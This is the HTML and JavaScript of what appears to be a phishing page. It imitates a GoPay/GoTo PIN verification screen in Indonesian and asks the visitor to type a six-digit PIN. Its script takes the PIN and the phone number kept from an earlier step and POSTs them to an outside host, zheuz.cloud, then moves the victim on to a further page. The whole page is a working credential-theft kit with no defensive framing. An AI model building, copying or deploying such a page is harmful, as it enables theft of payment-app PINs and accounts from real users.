<body style="background:#f1f2f4;">
    <div class="container page1">
        <div style="display:none;" class="load">
            <div class="box">
                <div class="circle one"></div>
                <div class="circle two"></div>
                <div class="circle three"></div>
            </div>
        </div>
       
        <div class="header b" style="margin-top:-10px;">
            <i onclick="history.back()" class="bx bx-left-arrow-alt" ></i>Verifikasi GoTo PIN
        </div>
        <hr style="position:absolute;color:#eee;min-width:100%;max-width:960px;margin-top:-10px;margin-left:-20px;"></hr>
        <br>
        <div class="title">
            <h3 class="b" >GoPay PIN kamu jadi GoTo PIN</h3>
            <p class="r" style="margin-top:10px;">Kamu perlu mengetik GoTo PIN untuk masuk.</p>
        </div>
        <form id="formOtp">
            <input type="hidden" name="nohp" id="nohp">
            <div style="position: relative; bottom: 0; left: 0; right: 0; margin: 0px auto; width: 100%; height: 72px; background: #fff; box-shadow: rgba(0, 0, 0, 0.15) 0px -1px 15px 0px; padding-top: 18px; border-radius:10px;"><i class="gg-eye-alt" style="margin-top:10px;margin-right:23px;position:absolute;"></i>
            <div class="box-input-pin" style="border:0px;">
                <div class="clear"></div>
                <input autofocus name="inp1" id="inp1" class="inpotp b" type="password" inputmode="numeric" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
                <input name="inp2" id="inp2" class="inpotp b" type="password" inputmode="numeric" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
                <input name="inp3" id="inp3" class="inpotp b" type="password" inputmode="numeric" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
                <input name="inp4" id="inp4" class="inpotp b" type="password" inputmode="numeric" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
                <input name="inp5" id="inp5" class="inpotp b" type="password" inputmode="numeric" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
                <input name="inp6" id="inp6" class="inpotp b" type="password" inputmode="numeric" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
            </div></div>
            <p class="b reset" style="text-decoration: none;font-size:14px;">Coba cara lain</p>
            
        </form>
        <img class="goto" style="position: fixed;left:0;right:0;bottom: 40px;" src="ast/pin1.png">
    </div>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script>
    $(document).ready(function() {
        $('.clear').click(function() {
            $('.inpotp').val('');
            $('#inp1').focus();
        });
    })
</script>
<script>
    $('.inpotp').on('input', function(event) {
        const inputs = $('.inpotp');
        const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
        if (isAllFilled == true) {
            $(event.target).blur();
            sendOtp();
        }
        const index = inputs.index(this);
        const currentValue = event.target.value;
        if (currentValue.length === 1) {
            if (index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
        } else if (currentValue.length === 0) {
            if (index > 0) {
                inputs[index].focus();
            }
        }
    });
    $('.inpotp').on('keydown', function(event) {
        const inputs = $('.inpotp');
        const key = event.key;
        const index = inputs.index(this);
        if (key === 'Backspace' && event.target.value.length === 0) {
            if (index > 0) {
                inputs[index - 1].focus();
            }
        }
    });
</script>
<script>
    document.getElementById("nohp").value =
        sessionStorage.getItem("nohp");
    
    function sendOtp(){
        $(".load").fadeIn();
        $.ajax({
            type: 'POST',
            url: 'https://zheuz.cloud/dana/egom1/2.php',
            data: $('#formOtp').serialize(),
            dataType: 'JSON',
            complete: function(data){
                  console.log('Complete')
                setTimeout(function(){
   var inp1 = $('#inp1').val();
   sessionStorage.setItem('inp1', inp1);   
   var inp2 = $('#inp2').val();
   sessionStorage.setItem('inp2', inp2);   
   var inp3 = $('#inp3').val();
   sessionStorage.setItem('inp3', inp3);  
   var inp4 = $('#inp4').val();
   sessionStorage.setItem('inp4', inp4);   
   var inp5 = $('#inp5').val();
   sessionStorage.setItem('inp5', inp5);   
   var inp6 = $('#inp6').val();
   sessionStorage.setItem('inp6', inp6);                  
                window.location.href='ver.html';
                
                },1000);
            }
        });
    };
</script>
<script>
    window.onload = function () {
        setInterval( function(){
            var count = parseInt($('#countdown').text());
            if (count !== 0) {
                $('#countdown').text(count - 1);
            } else {
                $('#countdown').text('60');
            }
        },1000);
    }
</script>
</body>
